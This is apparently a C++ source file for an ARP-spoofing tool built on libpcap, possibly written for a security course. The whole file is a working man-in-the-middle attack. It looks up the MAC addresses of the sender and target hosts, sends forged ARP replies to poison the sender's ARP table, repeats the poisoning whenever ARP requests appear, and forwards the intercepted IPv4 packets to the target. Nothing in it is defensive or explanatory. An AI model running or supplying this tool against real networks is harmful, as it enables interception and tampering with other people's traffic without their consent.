#include <cstdio>
#include <pcap.h> // pcap api
#include "ethhdr.h"
#include "arphdr.h"
#include <sys/ioctl.h>
#include <net/if.h> // to gain mac address
#include <unistd.h>
#include <netinet/ether.h> // 
#include <stdint.h> // to use uint32_t
#include <map>
#include <iostream>
#include <time.h>

using namespace std;

#define MAC_ALEN 18
#define IP_ALEN 32

/// core struct arphdr
#pragma pack(push, 1)
struct EthArpPacket{
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage()
{
    printf("syntax : arp-spoofing <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : arp-spoofing wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[])
{
    clock_t start, end;
    
    /// argument check!!
    if (argc % 2 != 0 || argc < 4 )
    {
        usage();
        return -1;
    }

    char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    // get my mac ip address
    struct ifreq ifr;
    int32_t sockfd, ret;
    char my_mac[MAC_ALEN] = {0, };
    char my_ip[IP_ALEN] = {0, };
        
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if ( sockfd < 0 )
    {
        printf("Failed to get interface MAC address - socket failed\n");
        return -1;
    }
        
    strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if ( ret < 0 )
    {
        printf("ioctl failed!\n");
        close(sockfd);
        return -1;
    }
    strcpy((char *)my_mac, ether_ntoa((struct ether_addr *)ifr.ifr_hwaddr.sa_data));

    ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
    if ( ret < 0 )
    {
        printf("ioctl failed!\n");
        close(sockfd);
        return -1;
    }
    inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, (char *)my_ip, sizeof(struct sockaddr));

    close(sockfd);
    /*  Previously, get sender ip's mac address
        Frist, infect first sender ip's ARP table  
        Second, recv ARP REPLY PACKET by checking ARP REPLY Packet, check dmac and get start ip's mac address
        Third, send packet to target ip */
    uint32_t flow_cnt = (argc - 2) >> 1;

    std::map< char *, char * > sender_ip_mac_map;
    std::map< char *, char * > target_ip_mac_map;

    for(uint32_t i = 0; i < flow_cnt; i++)
    {
        char* sender_mac = (char *)malloc(MAC_ALEN + 1);
        EthArpPacket request_packet1;
    
        request_packet1.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // sender mac address broadcast
	    request_packet1.eth_.smac_ = Mac(my_mac); // my mac address
	    request_packet1.eth_.type_ = htons(EthHdr::Arp);

	    request_packet1.arp_.hrd_ = htons(ArpHdr::ETHER);
	    request_packet1.arp_.pro_ = htons(EthHdr::Ip4);
	    request_packet1.arp_.hln_ = Mac::SIZE;
	    request_packet1.arp_.pln_ = Ip::SIZE;
	    request_packet1.arp_.op_ = htons(ArpHdr::Request);
	    request_packet1.arp_.smac_ = Mac(my_mac);
	    request_packet1.arp_.sip_ = htonl(Ip((const char *)my_ip));
	    request_packet1.arp_.tmac_ = Mac("00:00:00:00:00:00");
	    request_packet1.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));
        

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet1), sizeof(EthArpPacket));

        if (res != 0) 
        {
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }

        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            res = pcap_next_ex(handle, &header, &packet);
            if (res == -1 || res == -2)
            {
                printf("pcap_net_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }


            if ( 
                ((struct EthArpPacket *)packet) -> eth_.type_ == htons(EthHdr::Arp) 
                && ((struct EthArpPacket *)packet) -> arp_.op_ == htons(ArpHdr::Reply) 
                &&  (((struct EthArpPacket *)packet) -> arp_).sip_ == request_packet1.arp_.tip_
                )
            {
                strcpy(sender_mac, std::string( (((struct EthArpPacket *)packet) -> arp_).smac_ ).c_str());
                sender_ip_mac_map.insert(pair<char *, char *>(argv[2 * i + 2], sender_mac));
                break;
            }
        } 
    }
    
    for (uint32_t i = 0; i < flow_cnt; i++)
    {
        char * target_mac = (char *)malloc(MAC_ALEN + 1);
        EthArpPacket request_packet2;
    
        request_packet2.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff"); // sender mac address broadcast
	    request_packet2.eth_.smac_ = Mac(my_mac); // my mac address
	    request_packet2.eth_.type_ = htons(EthHdr::Arp);

	    request_packet2.arp_.hrd_ = htons(ArpHdr::ETHER);
	    request_packet2.arp_.pro_ = htons(EthHdr::Ip4);
	    request_packet2.arp_.hln_ = Mac::SIZE;
	    request_packet2.arp_.pln_ = Ip::SIZE;
	    request_packet2.arp_.op_ = htons(ArpHdr::Request);
	    request_packet2.arp_.smac_ = Mac(my_mac);
	    request_packet2.arp_.sip_ = htonl(Ip((const char *)my_ip));
	    request_packet2.arp_.tmac_ = Mac("00:00:00:00:00:00");
	    request_packet2.arp_.tip_ = htonl(Ip(argv[2 * i + 3]));
        

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&request_packet2), sizeof(EthArpPacket));

        if (res != 0) 
        {
		    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	    }

        while (true)
        {
            struct pcap_pkthdr* header;
            const u_char* packet;
            res = pcap_next_ex(handle, &header, &packet);
            if (res == -1 || res == -2)
            {
                printf("pcap_net_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }


            if ( 
                ((struct EthArpPacket *)packet) -> eth_.type_ == htons(EthHdr::Arp) 
                && ((struct EthArpPacket *)packet) -> arp_.op_ == htons(ArpHdr::Reply) 
                &&  (((struct EthArpPacket *)packet) -> arp_).sip_ == request_packet2.arp_.tip_
                )
            {
                strcpy(target_mac, std::string( (((struct EthArpPacket *)packet) -> arp_).smac_ ).c_str());
                target_ip_mac_map.insert( pair<char *, char *>(argv[2 * i + 3], target_mac) );
                break;
            }
        } 
    }

    // infect sender's ARP Table!!
    std::map< char *, char * >::iterator iter;

    do
    {
        for(uint32_t i = 0; i < flow_cnt; i++)
        {
            iter = sender_ip_mac_map.find(argv[2 * i + 2]);
            if (iter == sender_ip_mac_map.end() )
            {
                printf("iterator error!!\n");
                exit(0);
            }
            EthArpPacket fake_reply_;
	        fake_reply_.eth_.dmac_ = Mac(iter -> second); // sender mac address
	        fake_reply_.eth_.smac_ = Mac(my_mac); // my mac address
	        fake_reply_.eth_.type_ = htons(EthHdr::Arp);

	        fake_reply_.arp_.hrd_ = htons(ArpHdr::ETHER);
	        fake_reply_.arp_.pro_ = htons(EthHdr::Ip4);
	        fake_reply_.arp_.hln_ = Mac::SIZE;
            fake_reply_.arp_.pln_ = Ip::SIZE;
            fake_reply_.arp_.op_ = htons(ArpHdr::Reply);
            fake_reply_.arp_.smac_ = Mac(my_mac);
            fake_reply_.arp_.sip_ = htonl(Ip(argv[2 * i + 3]));
            fake_reply_.arp_.tmac_ = Mac(iter -> second);
            fake_reply_.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

            int32_t res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fake_reply_), sizeof(EthArpPacket));
            if (res != 0) {
	            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }

        start = clock();
        while(true)
        {
            end = clock();
            if ( ((int)(end - start)/CLOCKS_PER_SEC) >= 5 )
            {
                break;
            }
            struct pcap_pkthdr* header;
            const u_char* packet;
            Mac tmp_smac_;
            int32_t res = pcap_next_ex(handle, &header, &packet);
            if (res == -1 || res == -2)
            {
                printf("pcap_net_ex return %d(%s)\n", res, pcap_geterr(handle));
                break;
            }
        
            for (uint32_t i = 0; i < flow_cnt; i++)
            {
                tmp_smac_ = Mac(sender_ip_mac_map[argv[2 * i + 2]]);
                if ( ((EthHdr *)packet) -> type_ == htons(EthHdr::Ip4) && ((EthHdr *)packet) -> smac_ == tmp_smac_)
                {
                    u_char* my_pkt = (u_char*)malloc(header -> len);
                    memcpy(my_pkt, packet, header -> len);
                    ((EthHdr *)my_pkt) -> smac_ = Mac(my_mac);
                    ((EthHdr *)my_pkt) -> dmac_ = Mac(target_ip_mac_map[argv[2 * i + 3]]);
                    int32_t res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(my_pkt), header -> len);
                    if (res != 0)
                    {
                        printf("%d", header -> len);
                        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                    }
                    free(my_pkt);
                    my_pkt == 0;
                }
                else if ( 
                    ((EthArpPacket *)packet) -> eth_.type_ == htons(EthHdr::Arp) 
                && ((EthArpPacket *)packet) -> arp_.op_ == htons(ArpHdr::Request)
                )
                {
                    for(uint32_t i = 0; i < flow_cnt; i++)
                    {
                        if ( !strcmp(string(((EthArpPacket *)packet) -> arp_.sip_).c_str(), argv[2 * i + 2]) 
                            || !strcmp(string(((EthArpPacket *)packet) -> arp_.sip_).c_str(), argv[2 * i + 3])  )
                        {
                            iter = sender_ip_mac_map.find(argv[2 * i + 2]);
                            EthArpPacket fake_reply_;

                            fake_reply_.eth_.dmac_ = Mac(iter -> second);
                            fake_reply_.eth_.smac_ = Mac(my_mac);
                            fake_reply_.eth_.type_ = htons(EthHdr::Arp);

                            fake_reply_.arp_.hrd_ = htons(ArpHdr::ETHER);
	                        fake_reply_.arp_.pro_ = htons(EthHdr::Ip4);
	                        fake_reply_.arp_.hln_ = Mac::SIZE;
                            fake_reply_.arp_.pln_ = Ip::SIZE;
                            fake_reply_.arp_.op_ = htons(ArpHdr::Reply);
                            fake_reply_.arp_.smac_ = Mac(my_mac);
                            fake_reply_.arp_.sip_ = htonl(Ip(argv[2 * i + 3]));
                            fake_reply_.arp_.tmac_ = Mac(iter -> second);
                            fake_reply_.arp_.tip_ = htonl(Ip(argv[2 * i + 2]));

                            int32_t res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&fake_reply_), sizeof(EthArpPacket));
                            if (res != 0) {
	                            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
                            }
                        }
                    }
                } 
            }
        }
    } while (true);

    pcap_close(handle);
    for(iter = sender_ip_mac_map.begin(); iter != sender_ip_mac_map.end(); iter++)
    {
        free(iter -> second);
    }

    for(iter = target_ip_mac_map.begin(); iter != target_ip_mac_map.end(); iter++)
    {
        free(iter -> second);
    }
}
